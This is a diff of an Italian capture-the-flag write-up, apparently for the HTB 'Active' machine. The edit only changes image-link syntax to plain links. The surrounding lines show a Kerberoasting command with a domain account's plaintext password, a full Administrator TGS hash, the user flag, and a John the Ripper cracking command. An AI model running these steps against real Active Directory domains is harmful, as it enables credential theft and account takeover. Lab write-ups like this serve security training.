@@ -137,8 +137,7 @@ smb: \> ls
 Andando in "*/SVC_TGS/Desktop*" troviamo la user flag (che scarichiamo): `28c87548f9ab78a720b3bb15fe8d5e9d`
 
 ## 3. Privilege Escalation
-
-Siccome c'è *Kerberos* proviamo a fare **Kerberoasting** aiutandoci con **GetUserSPNs** di ![impacket](https://github.com/SecureAuthCorp/impacket)
+Siccome c'è *Kerberos* proviamo a fare **Kerberoasting** aiutandoci con **GetUserSPNs** di [impacket](https://github.com/SecureAuthCorp/impacket)
 
 ```shell
 └─$ impacket-GetUserSPNs -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18               
@@ -153,7 +152,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8f410c86adcd0c75896e222fdc0bdc57$c184b35f4f91825167193a299348125d7cb4b7bf4ef34bdda178f38aba8ac0b083bccd2038164b9ad339ca2f484b70a682eb925dfaf90506d95e0b0b38c0fe377486266f0100b0526fa8d6c8a0141b4cb78a7d5bf528e5d9aa717fb7510532ff2f83c77a59b83bf9db7eb95cf02b71dec181172a6d017549f3e19d60b0a9cdaaa644b18ca0a26637deaadf7488fe7283c085837f370134013a3a8563c39422b1843e7801604264a5bac2d89e71958ee2a58cb5edfba0cde17e05955d4a44c08f757cfa90c9747f06b48896e00fd39873012fd543691fbf0c30084a174dce656b1e0e200cbfe1ed2aa63c9f152e88501d4c10b034c54c14a0131c09831da9b600b86b2f0633ead7dd99b1e09a34d7659a50e7a2c02faf3ebccc438d8efa33194be47087211fd7a7477224d69f7f44e9c3b2f92a47ac9f72d6a1a5d6d1df9d4d84948582727a025e8a8ee60d6495aa59900221c4683a0895e2167fe94ff52172cfb0914dc3424b7316e03772a76040baf1a14c2052ff1647dd8f2fce7ed7728664f29ac03e918f7525d8abe727140268fc6e2f390396823fa7c62045aba56e82efed9b86212ef1eb2777f9afeacb0c6ab9b06a7a66ef01cfb439dc08a3b591dcab212d6c5336137c922aeaad4a540d802977fdca5200398301971a12022976c9b5fbdfecb800646f2842ac3fa0c7a23b28afb887d996bf74eb863d8dfdf33a84dbe83d78625daf25bb412fc889cf61bbdd883a4ce8944f5e54fb6dd9f04f92bf0566b71b42e0cffee9178eba882fc8858820c0967ea29cc972d40c1a86e8336df496148e24fecad64bd47aae2889dba6c979ac0a649134b612bf307474e2319cf99d5498113a0c7d6c87db70ed71e241a2b02fed9351d5a21d72edb70bec50f69f940a8dca830f80b2f9b2bb882318e00ea8cc329ea407307556a40675e3f82a4c865c50b6b65c144d4d7a6cb4fa4804199dfde6f81d9945f25595b05637fecf8faedbf10b88f262f1e02fc08559ebd86ad42b2743d643de32a102f6ede47cd535f3ae087ee84c9b490cf135c78bfe8418b6a1fe1c41d95c2800c9805ee00075e15753ceeaf955fb8df6195fe575d3ab102e58d231c5a750c685343948fa4e3db8f6e5f281f3c9040689755ec89e41befcab673ba97a40e9096c190d58eea97af3253ea517c2b17366038f4dc0fc70f6a07c38ef5b5f5aeb45586810c326b0fe1bf4e8881fd3443d5c29cf1f35340d763331fb11ca7a51c537ab35
 ```
 
-Abbiamo la password dell'amministratore sottoforma di hash. Proviamo a creccarla con ![John The Ripper](https://www.openwall.com/john/)
+Abbiamo la password dell'amministratore sottoforma di hash. Proviamo a creccarla con [John The Ripper](https://www.openwall.com/john/)
 
 ```shell
 └─$ john admin.hash -w=../rockyou.txt
